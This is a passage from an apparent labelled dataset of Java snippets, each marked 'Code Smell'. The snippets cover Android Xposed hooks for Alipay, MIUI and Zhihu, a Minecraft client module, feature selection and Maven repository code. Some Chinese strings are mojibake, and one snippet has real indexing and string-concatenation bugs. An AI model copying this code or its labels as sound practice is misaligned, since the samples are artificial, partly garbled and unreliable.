      return eruptUserService.getEruptMenuByValue(EruptMagicApiAutoConfiguration.MAGIC_API_MENU_PREFIX + EruptMagicApiAutoConfiguration.FUNCTION) != null;
    }
  }
 else   if (entity instanceof DataSourceInfo) {
    if (Authorization.SAVE == authorization || Authorization.DELETE == authorization) {
      return eruptUserService.getEruptMenuByValue(EruptMagicApiAutoConfiguration.MAGIC_API_MENU_PREFIX + EruptMagicApiAutoConfiguration.DATASOURCE) != null;
    }
  }
  return AuthorizationInterceptor.super.allowVisit(magicUser,request,authorization,entity);
}
",1,Code Smell
"@SuppressLint(""NonConstantResourceId"") public void onClick(View v){
  if (v.getId() == R.id.btn_test) {
    if (isApkInDebug(this)) {
      Toast toast=Toast.makeText(this,""娴嬭瘯"",Toast.LENGTH_SHORT);
      toast.setGravity(toast.getGravity(),toast.getXOffset(),Config.toastOffsetY());
      toast.show();
      sendBroadcast(new Intent(""com.eg.android.AlipayGphone.xqe.test""));
    }
    return;
  }
  String data=""file://"";
switch (v.getId()) {
case R.id.btn_forest_log:
    data+=FileUtils.getForestLogFile().getAbsolutePath();
  break;
case R.id.btn_farm_log:
data+=FileUtils.getFarmLogFile().getAbsolutePath();
break;
case R.id.btn_other_log:
data+=FileUtils.getOtherLogFile().getAbsolutePath();
break;
case R.id.btn_github:
data=""https://github.com/constanline/XQuickEnergy"";
break;
case R.id.btn_settings:
startActivity(new Intent(this,SettingsActivity.class));
return;
case R.id.btn_friend_watch:
ListDialog.show(this,getString(R.string.friend_watch),FriendWatch.getList(),new ArrayList<>(),null,ListDialog.ListType.SHOW);
return;
}
Intent it=new Intent(this,HtmlViewerActivity.class);
it.setData(Uri.parse(data));
startActivity(it);
}
",1,Code Smell
"@Override public void init(){
  Helpers.findAndHookMethod(""com.android.systemui.statusbar.phone.MiuiPhoneStatusBarView"",lpparam.classLoader,""handleEvent"",MotionEvent.class,new MethodHook(){
    @Override protected void before(    MethodHookParam param){
      boolean useCC=(boolean)XposedHelpers.callMethod(XposedHelpers.getObjectField(param.thisObject,""mPanelController""),""isExpandable"");
      if (useCC) {
        FrameLayout bar=(FrameLayout)param.thisObject;
        Object mControlPanelWindowManager=XposedHelpers.getObjectField(param.thisObject,""mControlPanelWindowManager"");
        boolean dispatchToControlPanel=(boolean)XposedHelpers.callMethod(mControlPanelWindowManager,""dispatchToControlPanel"",param.args[0],bar.getWidth());
        if (isAndroidU()) {
          XposedHelpers.setObjectField(mControlPanelWindowManager,""mTransToControlPanel"",dispatchToControlPanel);
        }
 else {
          XposedHelpers.callMethod(mControlPanelWindowManager,""setTransToControlPanel"",dispatchToControlPanel);
        }
        param.setResult(dispatchToControlPanel);
        return;
      }
      param.setResult(false);
    }
  }
);
  Helpers.findAndHookMethod(""com.android.systemui.controlcenter.phone.ControlPanelWindowManager"",lpparam.classLoader,""dispatchToControlPanel"",MotionEvent.class,float.class,new MethodHook(){
    @Override protected void before(    MethodHookParam param){
      boolean added=XposedHelpers.getBooleanField(param.thisObject,""added"");
      if (added) {
        boolean useCC;
        if (isMoreAndroidVersion(33)) {
          useCC=XposedHelpers.getBooleanField(XposedHelpers.getObjectField(param.thisObject,""mControlCenterController""),""useControlCenter"");
        }
 else {
          useCC=(boolean)XposedHelpers.callMethod(XposedHelpers.getObjectField(param.thisObject,""mControlCenterController""),""isExpandable"");
        }
        if (useCC) {
          MotionEvent motionEvent=(MotionEvent)param.args[0];
          if (motionEvent.getActionMasked() == 0) {
            XposedHelpers.setObjectField(param.thisObject,""mDownX"",motionEvent.getRawX());
          }
          Object controlCenterWindowView=XposedHelpers.getObjectField(param.thisObject,""mControlPanel"");
          if (controlCenterWindowView == null) {
            param.setResult(false);
          }
 else {
            float mDownX=XposedHelpers.getFloatField(param.thisObject,""mDownX"");
            float width=(float)param.args[1];
            if (mDownX < width / 2.0f) {
              param.setResult(XposedHelpers.callMethod(controlCenterWindowView,""handleMotionEvent"",motionEvent,true));
            }
 else {
              param.setResult(false);
            }
          }
          return;
        }
      }
      param.setResult(false);
    }
  }
);
}",1,Code Smell
"@Override public void handleLoadPackage(final XC_LoadPackage.LoadPackageParam lpparam){
  if (Helper.hookPackage.equals(lpparam.packageName)) {
    boolean isMainProcess=Helper.hookPackage.equals(lpparam.processName);
    Context systemContext=(Context)XposedHelpers.callMethod(XposedHelpers.callStaticMethod(XposedHelpers.findClass(""android.app.ActivityThread"",lpparam.classLoader),""currentActivityThread""),""getSystemContext"");
    if (!Helper.checkSignature(systemContext)) {
      tryLoadNative(isMainProcess);
      Helper.officialZhihu=false;
    }
    if (!isMainProcess)     return;
    try {
      XposedBridge.hookAllConstructors(lpparam.classLoader.loadClass(""com.tencent.tinker.loader.app.TinkerApplication""),new XC_MethodHook(){
        @Override protected void beforeHookedMethod(        MethodHookParam param){
          param.args[0]=0;
        }
      }
);
    }
 catch (    ClassNotFoundException ignored) {
    }
    XposedHelpers.findAndHookMethod(android.app.Instrumentation.class,""callApplicationOnCreate"",Application.class,new XC_MethodHook(){
      @Override protected void afterHookedMethod(      MethodHookParam param){
        if (param.args[0] instanceof Application) {
          Helper.context=((Application)param.args[0]).getApplicationContext();
          if (!Helper.init(lpparam.classLoader))           Helper.toast(""鐭ヤ簡鍒濆鍖栧け璐ワ紝鍙兘涓嶆敮鎸佸綋鍓嶇増鏈煡涔�: "" + Helper.packageInfo.versionName,Toast.LENGTH_SHORT);
 else {
            Hooks.init(lpparam.classLoader);
            if (!Helper.prefs.getBoolean(""switch_mainswitch"",false))             Helper.toast(""鐭ヤ簡鍔犺浇鎴愬姛锛岃鍒拌缃〉闈㈠紑鍚姛鑳姐��"",Toast.LENGTH_LONG);
          }
        }
      }
    }
);
    XposedHelpers.findAndHookMethod(File.class,""exists"",new XC_MethodHook(){
      @Override protected void beforeHookedMethod(      MethodHookParam param){
        File file=(File)param.thisObject;
        if (file.getName().equals("".allowXposed"")) {
          param.setResult(true);
        }
      }
    }
);
  }
}",1,Code Smell
"private void listDirs(){
  _entries.clear();
  if (_currentDir == null) {
    _currentDir=new File(FileUtil.getStoragePath(_context,false));
  }
  File[] files=_currentDir.listFiles(_fileFilter);
  LinkedHashMap<String,String> storagePaths=FileUtil.getStoragePaths(_context);
  Set<String> storageKeys=storagePaths.keySet();
  boolean withinVolume=false;
  for (  String storageKey : storageKeys) {
    if (_currentDir.getAbsolutePath().startsWith(storageKey)) {
      withinVolume=true;
      break;
    }
  }
  if (!withinVolume) {
    for (    String storageKey : storageKeys) {
      _entries.add(new RootFile(storageKey,storagePaths.get(storageKey)));
    }
  }
  boolean displayPath=false;
  if (_entries.isEmpty()) {
    _entries.add(new RootFile(_currentDir.getParentFile().getAbsolutePath(),""..""));
    displayPath=true;
  }
  if (files == null || !withinVolume) {
    if (_alertDialog != null && _alertDialog.isShowing() && _displayPath) {
      displayPath(null);
    }
    return;
  }
  List<File> dirList=new LinkedList<>();
  List<File> fileList=new LinkedList<>();
  for (  File f : files) {
    if (f.isDirectory()) {
      dirList.add(f);
    }
 else {
      fileList.add(f);
    }
  }
  sortByName(dirList);
  sortByName(fileList);
  _entries.addAll(dirList);
  _entries.addAll(fileList);
  if (_alertDialog != null && !_disableTitle) {
    if (_followDir) {
      if (displayPath) {
        _alertDialog.setTitle(_currentDir.getName());
      }
 else {
        if (_titleRes != -1) {
          _alertDialog.setTitle(_titleRes);
        }
 else         if (_title != null) {
          _alertDialog.setTitle(_title);
        }
 else {
          _alertDialog.setTitle(R.string.choose_file);
        }
      }
    }
  }
  if (_alertDialog != null && _alertDialog.isShowing() && _displayPath) {
    if (displayPath) {
      displayPath(_currentDir.getPath());
    }
 else {
      displayPath(null);
    }
  }
}",1,Code Smell
"/** 
 * Layout is happening from end -> start
 */
private void calculateIconTranslations(){
  try {
    int iconCount=mMeasureViews.size();
    float width=getWidth();
    if (width == 0)     return;
    if (mRowCount == 0) {
      mRowCount=(int)Math.ceil((mIconWidths.size() + (mHasDot ? 1 : 0)) / (double)mColWidths.size());
    }
    final float XEndPoint=width - getPaddingEnd();
    float xPosition=XEndPoint;
    int currentRow=0;
    float rowTop;
    if (iconCount == 0) {
      rowTop=(getHeight() - mIconDotFrameWidth) / 2f;
    }
 else {
      rowTop=(getHeight() - (mRowCount * mIconSize)) / 2f;
    }
    int colIndex=0;
    for (int i=0; i < iconCount + (mHasDot ? 1 : 0); i++, colIndex++) {
      View icon=(i < iconCount) ? mMeasureViews.get(i) : mDotIcon;
      int iconWidth=(i < iconCount) ? icon.getWidth() : mIconDotFrameWidth;
      Object childState=getViewStateFromChild(icon);
      float iconTranslationY=0;
      float iconTranslationX=0;
switch (sortPlan) {
case SORT_CLEAN:
        if (colIndex == mColWidths.size()) {
          colIndex=0;
          xPosition=XEndPoint;
          currentRow++;
          rowTop=(getHeight() - (mRowCount * mIconSize) + (2 * mIconSize * currentRow)) / 2f;
        }
      if (i < iconCount) {
        setChildVisibleState(icon,STATE_ICON);
      }
    float shift=((mColWidths.get(colIndex) - iconWidth) / 2f);
  iconTranslationX=xPosition - mColWidths.get(colIndex) + shift;
xPosition-=mColWidths.get(colIndex) + mIconSpacing;
iconTranslationY=Math.round(rowTop + (mIconSize - icon.getMeasuredHeight()) / 2f);
break;
case SORT_TIGHT:
if (xPosition >= iconWidth) {
xPosition-=iconWidth;
iconTranslationX=xPosition;
setObjectField(childState,stateXTranslationField,xPosition);
}
 else {
currentRow++;
i--;
rowTop=(getHeight() - (mRowCount * mIconSize) + (2 * mIconSize * currentRow)) / 2f;
xPosition=XEndPoint;
continue;
}
iconTranslationY=Math.round(rowTop + (mIconSize - icon.getMeasuredHeight()) / 2f);
break;
}
if (icon != mDotIcon) {
setChildVisibleState(icon,STATE_ICON);
}
setObjectField(childState,stateXTranslationField,iconTranslationX);
setObjectField(childState,stateYTranslationField,iconTranslationY);
}
mMeasureViews.clear();
mDotIcon=null;
System.gc();
}
 catch (Throwable t) {
log(""PixelXpert Error - Flex Statusbar Container"");
log(t);
}
}",1,Code Smell
"@Override public SelectedFeatureSet select(Dataset<Label> dataset){
  FSMatrix data=FSMatrix.buildMatrix(dataset,numBins);
  ImmutableFeatureMap fmap=data.getFeatureMap();
  int max=k == -1 ? fmap.size() : Math.min(k,fmap.size());
  int numFeatures=fmap.size();
  boolean[] unselectedFeatures=new boolean[numFeatures];
  Arrays.fill(unselectedFeatures,true);
  int[] selectedFeatures=new int[max];
  double[] selectedScores=new double[max];
  double[] miCache;
  int[] idxCache=new int[numFeatures];
  if (numThreads > 1) {
    ForkJoinPool fjp=new ForkJoinPool(numThreads);
    try {
      miCache=fjp.submit(() -> IntStream.range(0,numFeatures).parallel().mapToDouble(data::mi).toArray()).get();
    }
 catch (    InterruptedException|ExecutionException e) {
      throw new RuntimeException(e);
    }
    fjp.shutdown();
  }
 else {
    miCache=IntStream.range(0,numFeatures).mapToDouble(data::mi).toArray();
  }
  int curIdx=-1;
  double curVal=-1.0;
  for (int i=0; i < numFeatures; i++) {
    if (miCache[i] > curVal) {
      curIdx=i;
      curVal=miCache[i];
    }
  }
  selectedFeatures[0]=curIdx;
  selectedScores[0]=curVal;
  unselectedFeatures[curIdx]=false;
  logger.log(Level.INFO,""Itr 0: selected feature "" + fmap.get(curIdx).getName() + "", score = ""+ selectedScores[0]);
  for (int i=1; i < max; i++) {
    double curMaxVal=-1.0;
    int curMaxIdx=-1;
    for (int j=0; j < numFeatures; j++) {
      if (unselectedFeatures[j]) {
        while ((miCache[j] > curMaxVal) && (idxCache[j] < i)) {
          double newVal=data.cmi(j,selectedFeatures[idxCache[j]]);
          if (newVal < miCache[j]) {
            miCache[j]=newVal;
          }
          idxCache[j]++;
        }
        if (miCache[j] > curMaxVal) {
          curMaxVal=miCache[j];
          curMaxIdx=j;
        }
      }
    }
    selectedFeatures[i]=curMaxIdx;
    selectedScores[i]=curMaxVal;
    unselectedFeatures[curMaxIdx]=false;
    logger.log(Level.INFO,""Itr "" + i + "": selected feature ""+ fmap.get(curMaxIdx).getName()+ "", score = ""+ curMaxVal);
  }
  ArrayList<String> names=new ArrayList<>();
  ArrayList<Double> scores=new ArrayList<>();
  for (int i=0; i < max; i++) {
    names.add(fmap.get(selectedFeatures[i]).getName());
    scores.add(selectedScores[i]);
  }
  FeatureSetProvenance provenance=new FeatureSetProvenance(SelectedFeatureSet.class.getName(),dataset.getProvenance(),getProvenance());
  return new SelectedFeatureSet(names,scores,isOrdered(),provenance);
}",1,Code Smell
"@EventHandler private void onTick(TickEvent.Pre event){
  if (target == null) {
    if (mc.crosshairTarget == null || mc.crosshairTarget.getType() != HitResult.Type.BLOCK)     return;
    BlockPos pos=((BlockHitResult)mc.crosshairTarget).getBlockPos().up();
    BlockState state=mc.world.getBlockState(pos);
    if (state.isReplaceable() || state.getBlock() == Blocks.ENDER_CHEST) {
      target=((BlockHitResult)mc.crosshairTarget).getBlockPos().up();
    }
 else     return;
  }
  if (!PlayerUtils.isWithinReach(target)) {
    error(""Target block pos out of reach."");
    target=null;
    return;
  }
  if (selfToggle.get() && InvUtils.find(Items.OBSIDIAN).count() - (ignoreExisting.get() ? startCount : 0) >= amount.get()) {
    InvUtils.swapBack();
    toggle();
    return;
  }
  if (mc.world.getBlockState(target).getBlock() == Blocks.ENDER_CHEST) {
    double bestScore=-1;
    int bestSlot=-1;
    for (int i=0; i < 9; i++) {
      ItemStack itemStack=mc.player.getInventory().getStack(i);
      if (EnchantmentHelper.getLevel(Enchantments.SILK_TOUCH,itemStack) > 0)       continue;
      double score=itemStack.getMiningSpeedMultiplier(Blocks.ENDER_CHEST.getDefaultState());
      if (score > bestScore) {
        bestScore=score;
        bestSlot=i;
      }
    }
    if (bestSlot == -1)     return;
    InvUtils.swap(bestSlot,true);
    BlockUtils.breakBlock(target,swingHand.get());
  }
  if (mc.world.getBlockState(target).isReplaceable()) {
    FindItemResult echest=InvUtils.findInHotbar(Items.ENDER_CHEST);
    if (!echest.found()) {
      error(""No Echests in hotbar, disabling"");
      toggle();
      return;
    }
    BlockUtils.place(target,echest,true,0,true);
  }
}",1,Code Smell
"/** 
 * Execute required method service
 * @param context   the context
 * @param target    the target information
 * @param type      the operation type
 * @throws Exception the exception
 */
public void executeTarget(RequestContext context,String target,String type) throws Exception {
  String targetKey=getActionKey(type,target);
  if (actions.containsKey(targetKey)) {
    actions.get(targetKey).execute(context);
    if ("".do"".equals(context.requestType())) {
      context.getResp().setStatus(HttpServletResponse.SC_OK);
      return;
    }
  }
  String templatePath=getTemplateName(type,target);
  if (TYPE_SCREEN.equals(type)) {
    if (context.isRedirected()) {
      if (TStringUtils.isNotEmpty(context.getRedirectTarget())) {
        context.setTarget(context.getRedirectTarget());
        context.setRedirectTarget(null);
        context.setRedirectLocation(null);
        executeTarget(context,context.getTarget(),type);
      }
 else {
        context.getResp().sendRedirect(context.getRedirectLocation());
      }
    }
 else {
      if (!this.templates.containsKey(templatePath)) {
        throw new TemplateNotFoundException(new StringBuilder(256).append(""Invalid "").append(type).append("" template path:"").append(templatePath).toString());
      }
      context.put(SCREEN_PLACEHOLDER,engine.renderTemplate(templatePath,context));
    }
  }
 else {
    String realTemplatePath=templatePath;
    if (!templates.containsKey(templatePath) && TYPE_LAYOUT.equals(type)) {
      realTemplatePath=getLayout(target);
    }
    if (realTemplatePath == null) {
      throw new TemplateNotFoundException(new StringBuilder(256).append(""Invalid "").append(type).append("" template path:"").append(templatePath).toString());
    }
    if (!realTemplatePath.equals(templatePath)) {
      String realTargetKey=realTemplatePath.substring(0,realTemplatePath.indexOf("".vm""));
      if (actions.containsKey(realTargetKey)) {
        actions.get(realTargetKey).execute(context);
      }
    }
    engine.renderTemplate(realTemplatePath,context,context.getResp().getWriter());
  }
}",1,Code Smell
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.math.protos.KernelProto)) {
    return super.equals(obj);
  }
  org.tribuo.math.protos.KernelProto other=(org.tribuo.math.protos.KernelProto)obj;
  if (getVersion() != other.getVersion())   return false;
  if (!getClassName().equals(other.getClassName()))   return false;
  if (hasSerializedData() != other.hasSerializedData())   return false;
  if (hasSerializedData()) {
    if (!getSerializedData().equals(other.getSerializedData()))     return false;
  }
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",1,Code Smell
"public void setExpanded(boolean expanded){
  setExpanded(expanded,true);
}
public void setExpanded(boolean expanded,boolean animation){
  if (mExpanded != expanded) {
    mExpanded=expanded;
    if (mAutoCancel) {
      if (expanded) {
        setOnClickListener(this);
      }
 else {
        setClickable(false);
      }
    }
    final int count=getChildCount();
    if (count > 0) {
      if (mMainFabCenterY == -1f || !animation) {
        int checkCount=mHidePrimaryFab ? count : count - 1;
        for (int i=0; i < checkCount; i++) {
          View child=getChildAt(i);
          if (child.getVisibility() == GONE) {
            continue;
          }
          child.setVisibility(expanded ? View.VISIBLE : View.INVISIBLE);
          if (expanded) {
            child.setAlpha(1f);
          }
        }
      }
 else {
        if (mHidePrimaryFab) {
          setPrimaryFabAnimation(getChildAt(count - 1),expanded,!expanded);
        }
        for (int i=0; i < count - 1; i++) {
          View child=getChildAt(i);
          if (child.getVisibility() == GONE) {
            continue;
          }
          setSecondaryFabAnimation(child,expanded,expanded);
        }
      }
    }
    if (mOnExpandListener != null) {
      mOnExpandListener.onExpand(expanded);
    }
  }
}",1,Code Smell
"private void submitSectionTasks(ChunkJobCollector importantCollector,ChunkJobCollector semiImportantCollector,ChunkJobCollector deferredCollector){
  this.submitSectionTasks(importantCollector,ChunkUpdateType.IMPORTANT_SORT,true);
  this.submitSectionTasks(semiImportantCollector,ChunkUpdateType.IMPORTANT_REBUILD,true);
  this.submitSectionTasks(deferredCollector,ChunkUpdateType.REBUILD,false);
  this.submitSectionTasks(deferredCollector,ChunkUpdateType.INITIAL_BUILD,false);
  this.submitSectionTasks(deferredCollector,ChunkUpdateType.SORT,true);
}
private void submitSectionTasks(ChunkJobCollector collector,ChunkUpdateType type,boolean ignoreEffortCategory){
  var queue=this.taskLists.get(type);
  while (!queue.isEmpty() && collector.hasBudgetFor(type.getTaskEffort(),ignoreEffortCategory)) {
    RenderSection section=queue.remove();
    if (section.isDisposed()) {
      continue;
    }
    var pendingUpdate=section.getPendingUpdate();
    if (pendingUpdate != null && pendingUpdate != type) {
      continue;
    }
    int frame=this.lastUpdatedFrame;
    ChunkBuilderTask<? extends BuilderTaskOutput> task;
    if (type == ChunkUpdateType.SORT || type == ChunkUpdateType.IMPORTANT_SORT) {
      task=this.createSortTask(section,frame);
      if (task == null) {
        continue;
      }
    }
 else {
      task=this.createRebuildTask(section,frame);
      if (task == null) {
        var result=ChunkJobResult.successfully(new ChunkBuildOutput(section,frame,NoData.forEmptySection(section.getPosition()),BuiltSectionInfo.EMPTY,Collections.emptyMap()));
        this.buildResults.add(result);
        section.setTaskCancellationToken(null);
      }
    }
    if (task != null) {
      var job=this.builder.scheduleTask(task,type.isImportant(),collector::onJobFinished);
      collector.addSubmittedJob(job);
      section.setTaskCancellationToken(job);
    }
    section.setLastSubmittedFrame(frame);
    section.setPendingUpdate(null);
  }
}
",1,Code Smell
"private Map<String,List<Tuple<Long,String>>> handleTopConnectorESQueryResponse(ESQueryResponse response,List<String> metricNameList,int topN){
  Map<String,List<Tuple<Long,String>>> ret=new HashMap<>();
  Map<String,ESAggr> esAggrMap=this.checkBucketsAndHitsOfResponseAggs(response);
  if (null == esAggrMap) {
    return ret;
  }
  Map<String,List<Triple<Long,String,Double>>> metricValueMap=new HashMap<>();
  for (  String metricName : metricNameList) {
    esAggrMap.get(HIST).getBucketList().forEach(esBucket -> {
      try {
        if (null != esBucket.getUnusedMap().get(KEY)) {
          String connectorNameAndClusterId=esBucket.getUnusedMap().get(KEY).toString();
          Object value=esBucket.getAggrMap().get(HIST).getBucketList().get(0).getAggrMap().get(metricName).getUnusedMap().get(VALUE);
          if (value == null) {
            return;
          }
          Double metricValue=Double.valueOf(value.toString());
          Tuple<String,Long> tuple=splitConnectorNameAndClusterId(connectorNameAndClusterId);
          if (null == tuple) {
            return;
          }
          metricValueMap.putIfAbsent(metricName,new ArrayList<>());
          metricValueMap.get(metricName).add(new Triple<>(tuple.getV2(),tuple.getV1(),metricValue));
        }
      }
 catch (      Exception e) {
        LOGGER.error(""method=handleTopConnectorESQueryResponse||metricName={}||errMsg=exception!"",metricName,e);
      }
    }
);
  }
  for (  Map.Entry<String,List<Triple<Long,String,Double>>> entry : metricValueMap.entrySet()) {
    entry.getValue().sort((o1,o2) -> {
      if (null == o1 || null == o2) {
        return 0;
      }
      return o2.v3().compareTo(o1.v3());
    }
);
    List<Triple<Long,String,Double>> temp=(entry.getValue().size() > topN) ? entry.getValue().subList(0,topN) : entry.getValue();
    List<Tuple<Long,String>> connectorList=new ArrayList<>();
    for (    Triple<Long,String,Double> triple : temp) {
      connectorList.add(new Tuple<>(triple.v1(),triple.v2()));
    }
    ret.put(entry.getKey(),connectorList);
  }
  return ret;
}",1,Code Smell
"@Override public boolean onTouchEvent(MotionEvent event){
  if (chartData == null) {
    return false;
  }
  if (!enabled) {
    pickerDelegate.uncapture(event,event.getActionIndex());
    getParent().requestDisallowInterceptTouchEvent(false);
    chartCaptured=false;
    return false;
  }
  int x=(int)event.getX(event.getActionIndex());
  int y=(int)event.getY(event.getActionIndex());
switch (event.getActionMasked()) {
case MotionEvent.ACTION_DOWN:
    capturedTime=System.currentTimeMillis();
  getParent().requestDisallowInterceptTouchEvent(true);
boolean captured=pickerDelegate.capture(x,y,event.getActionIndex());
if (captured) {
return true;
}
capturedX=lastX=x;
capturedY=lastY=y;
if (chartArea.contains(x,y)) {
if (selectedIndex < 0 || !animateLegentTo) {
chartCaptured=true;
selectXOnChart(x,y);
}
return true;
}
return false;
case MotionEvent.ACTION_POINTER_DOWN:
return pickerDelegate.capture(x,y,event.getActionIndex());
case MotionEvent.ACTION_MOVE:
int dx=x - lastX;
int dy=y - lastY;
if (pickerDelegate.captured()) {
boolean rez=pickerDelegate.move(x,y,event.getActionIndex());
if (event.getPointerCount() > 1) {
x=(int)event.getX(1);
y=(int)event.getY(1);
pickerDelegate.move(x,y,1);
}
getParent().requestDisallowInterceptTouchEvent(rez);
return true;
}
if (chartCaptured) {
boolean disable;
if (canCaptureChartSelection && System.currentTimeMillis() - capturedTime > 200) {
disable=true;
}
 else {
disable=Math.abs(dx) > Math.abs(dy) || Math.abs(dy) < touchSlop;
}
lastX=x;
lastY=y;
getParent().requestDisallowInterceptTouchEvent(disable);
selectXOnChart(x,y);
}
 else if (chartArea.contains(capturedX,capturedY)) {
int dxCaptured=capturedX - x;
int dyCaptured=capturedY - y;
if (Math.sqrt(dxCaptured * dxCaptured + dyCaptured * dyCaptured) > touchSlop || System.currentTimeMillis() - capturedTime > 200) {
chartCaptured=true;
selectXOnChart(x,y);
}
}
return true;
case MotionEvent.ACTION_POINTER_UP:
pickerDelegate.uncapture(event,event.getActionIndex());
return true;
case MotionEvent.ACTION_CANCEL:
case MotionEvent.ACTION_UP:
if (pickerDelegate.uncapture(event,event.getActionIndex())) {
return true;
}
if (chartArea.contains(capturedX,capturedY) && !chartCaptured) {
animateLegend(false);
}
pickerDelegate.uncapture();
updateLineSignature();
getParent().requestDisallowInterceptTouchEvent(false);
chartCaptured=false;
onActionUp();
invalidate();
long min=0;
if (useMinHeight) min=findMinValue(startXIndex,endXIndex);
setMaxMinValue(findMaxValue(startXIndex,endXIndex),min,true,true,false);
return true;
}
return false;
}",1,Code Smell
"/** 
 * 鏌ユ壘缁忚繃棣栭�変紭鍏堢骇鎺掑簭鎺ュ彈鍜屾牎楠岀殑 {@linkplain DriverEntityDriver}鍒楄〃銆� <p> 瓒婇潬鍓嶇殑棣栭�変紭鍏堢骇瓒婇珮銆� </p>
 * @param connectionOption
 * @param accepted
 * @param checked
 */
protected void findOrderedAcceptedAndCheckedDriverEntityDrivers(ConnectionOption connectionOption,List<DriverEntityDriver> accepted,List<DriverEntityDriver> checked){
  List<DriverEntity> driverEntities=this.driverEntityManager.getAll();
  for (  DriverEntity driverEntity : driverEntities) {
    Driver driver=null;
    try {
      driver=this.driverEntityManager.getDriver(driverEntity);
    }
 catch (    Throwable t) {
      if (LOGGER.isErrorEnabled())       LOGGER.error(""Get Driver with ["" + driverEntity + ""] for getting prefered connection for [""+ connectionOption.copyOfPsdMask()+ ""] error"",t);
    }
    if (driver != null) {
      boolean accept=false;
      try {
        accept=acceptsURL(driver,connectionOption.getUrl());
      }
 catch (      Throwable t) {
        if (LOGGER.isErrorEnabled())         LOGGER.error(""Check if url accepted with ["" + driverEntity + ""] for getting prefered connection for [""+ connectionOption.copyOfPsdMask()+ ""] error"",t);
      }
      if (accept) {
        DriverEntityDriver driverEntityDriver=new DriverEntityDriver(driverEntity,driver);
        accepted.add(driverEntityDriver);
        try {
          if (this.driverChecker.check(driver,connectionOption,true))           checked.add(driverEntityDriver);
        }
 catch (        Throwable t) {
          if (LOGGER.isErrorEnabled())           LOGGER.error(""Check if ["" + driverEntity + ""] 's driver checked for getting prefered connection for [""+ connectionOption.copyOfPsdMask()+ ""] error"",t);
        }
      }
    }
  }
  Comparator<DriverEntityDriver> comparator=new Comparator<DriverEntityDriver>(){
    @Override public int compare(    DriverEntityDriver o1,    DriverEntityDriver o2){
      Driver d1=o1.getDriver();
      Driver d2=o2.getDriver();
      if (isHigherVersion(d1,d2))       return -1;
 else       if (isHigherVersion(d2,d1))       return 1;
 else       return 0;
    }
  }
;
  Collections.sort(accepted,comparator);
  Collections.sort(checked,comparator);
}",1,Code Smell
"public static void main(String[] args){
  Scanner sc=new Scanner(System.in);
  int testCases=Integer.parseInt(sc.nextLine());
  for (int i=0; i < testCases; i++) {
    int size=Integer.parseInt(sc.nextLine());
    int[][] matrix=new int[size][size];
    for (int j=0; j < size; j++) {
      String[] strArr=sc.nextLine().split("" "");
      for (int k=0; k < strArr.length; k++) {
        matrix[i][k]=Integer.parseInt(strArr[k]);
      }
    }
    int row=0;
    int col=0;
    int sum=0;
    for (int k=0; k < size; k++) {
      sum+=matrix[k][k];
    }
    for (int k=0; k < size; k++) {
      Set<Integer> set=new HashSet<>();
      for (int l=0; l < size; l++) {
        if (set.contains(matrix[k][l])) {
          row++;
          break;
        }
        set.add(matrix[k][l]);
      }
      set.clear();
      for (int l=0; l < size; l++) {
        if (set.contains(matrix[l][k])) {
          col++;
          break;
        }
        set.add(matrix[l][k]);
      }
    }
    System.out.println(""Case #"" + i + 1+ "":""+ sum+ "" ""+ row+ "" ""+ col);
  }
}",1,Code Smell
"@Nullable public MavenRepository normalizeRepository(MavenRepository originalRepository,MavenExecutionContextView ctx,@Nullable ResolvedPom containingPom){
  Optional<MavenRepository> result=null;
  MavenRepository repository=originalRepository;
  if (containingPom != null) {
    repository=repository.withUri(containingPom.getValue(repository.getUri()));
  }
  repository=applyAuthenticationToRepository(applyMirrors(repository));
  try {
    if (repository.isKnownToExist()) {
      return repository;
    }
    if (repository.getUri().contains(""${"")) {
      ctx.getResolutionListener().repositoryAccessFailed(repository.getUri(),new IllegalArgumentException(""Repository "" + repository.getUri() + "" contains an unresolved property placeholder.""));
      return null;
    }
    if (repository.getUri().contains(""0.0.0.0"")) {
      ctx.getResolutionListener().repositoryAccessFailed(repository.getUri(),new IllegalArgumentException(""Repository "" + repository.getUri() + "" has invalid IP address.""));
      return null;
    }
    String originalUrl=repository.getUri();
    if (""file"".equals(URI.create(originalUrl).getScheme())) {
      return repository;
    }
    result=mavenCache.getNormalizedRepository(repository);
    if (result == null) {
      if (!repository.getUri().toLowerCase().startsWith(""http"")) {
        ctx.getResolutionListener().repositoryAccessFailed(repository.getUri(),new IllegalArgumentException(""Repository "" + repository.getUri() + "" is not HTTP(S).""));
        return null;
      }
      String httpsUri=repository.getUri().toLowerCase().startsWith(""http:"") ? repository.getUri().replaceFirst(""[hH][tT][tT][pP]://"",""https://"") : repository.getUri();
      if (!httpsUri.endsWith(""/"")) {
        httpsUri+=""/"";
      }
      HttpSender.Request.Builder request=applyAuthenticationToRequest(repository,httpSender.get(httpsUri));
      MavenRepository normalized=null;
      try {
        sendRequest(request.build());
        normalized=repository.withUri(httpsUri).withKnownToExist(true);
      }
 catch (      Throwable t) {
        if (t instanceof HttpSenderResponseException) {
          HttpSenderResponseException e=(HttpSenderResponseException)t;
          if (e.isServerReached()) {
            normalized=repository.withUri(httpsUri);
          }
        }
        if (normalized == null) {
          if (!httpsUri.equals(originalUrl)) {
            try {
              sendRequest(request.url(originalUrl).build());
              normalized=new MavenRepository(repository.getId(),originalUrl,repository.getReleases(),repository.getSnapshots(),repository.getUsername(),repository.getPassword());
            }
 catch (            HttpSenderResponseException e) {
              if (e.isServerReached()) {
                normalized=new MavenRepository(repository.getId(),originalUrl,repository.getReleases(),repository.getSnapshots(),repository.getUsername(),repository.getPassword());
              }
            }
catch (            Throwable e) {
            }
          }
        }
        if (normalized == null && !(t instanceof HttpSenderResponseException && ((HttpSenderResponseException)t).getBody().contains(""Directory listing forbidden""))) {
          ctx.getResolutionListener().repositoryAccessFailed(repository.getUri(),t);
        }
      }
      mavenCache.putNormalizedRepository(repository,normalized);
      result=Optional.ofNullable(normalized);
    }
  }
 catch (  Exception e) {
    ctx.getResolutionListener().repositoryAccessFailed(repository.getUri(),e);
    ctx.getOnError().accept(e);
    mavenCache.putNormalizedRepository(repository,null);
  }
  return result == null || !result.isPresent() ? null : applyAuthenticationToRepository(result.get());
}",1,Code Smell
"private boolean readAtomHeader(ExtractorInput input) throws IOException, InterruptedException {
  if (atomHeaderBytesRead == 0) {
    if (!input.readFully(atomHeader.data,0,Atom.HEADER_SIZE,true)) {
      return false;
    }
    atomHeaderBytesRead=Atom.HEADER_SIZE;
    atomHeader.setPosition(0);
